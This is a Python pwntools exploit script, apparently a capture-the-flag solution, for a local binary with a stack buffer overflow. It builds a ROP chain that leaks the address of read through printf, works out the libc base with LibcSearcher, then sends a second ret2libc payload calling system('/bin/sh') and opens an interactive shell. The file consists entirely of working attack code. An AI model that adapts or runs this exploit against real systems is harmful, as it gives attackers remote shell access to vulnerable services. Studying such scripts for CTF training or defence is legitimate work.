#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

if(sys.argv[1] == 'l'):
	p = process("./test")
	elf = ELF('./test')
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
else:
	p = remote()
	elf = ELF("./")


formatstr = 0x0400875
printf_plt = elf.plt['printf']
read_got = elf.got['read']
vuln = 0x4006D2
#vuln = 0x400769
pop_rdi_ret = 0x0000000000400823
pop_rsi_r15_ret = 0x0000000000400821
ret = 0x000000000040055e

#gdb.attach(p,'b *0x400752')
#pause()

###leak libc###
payload = '\x00' * 0x80 + 'deadbeef'
payload+= p64(pop_rdi_ret) + p64(formatstr)
payload+= p64(pop_rsi_r15_ret) + p64(read_got) + p64(0)
payload+= p64(printf_plt) + p64(ret) + p64(vuln) 

ru("how long is your name: ")
sl(str(len(payload)+8))

ru("and what's you name? ")
sd(payload)


read = u64(ru('\x7f')[-6:].ljust(8,'\x00'))
libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search('/bin/sh').next()

###get shell###
payload = 'A' * 0x80 + 'deadbeef' + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)

ru("how long is your name: ")
sl(str(len(payload)))

ru("and what's you name? ")
sd(payload)

ia()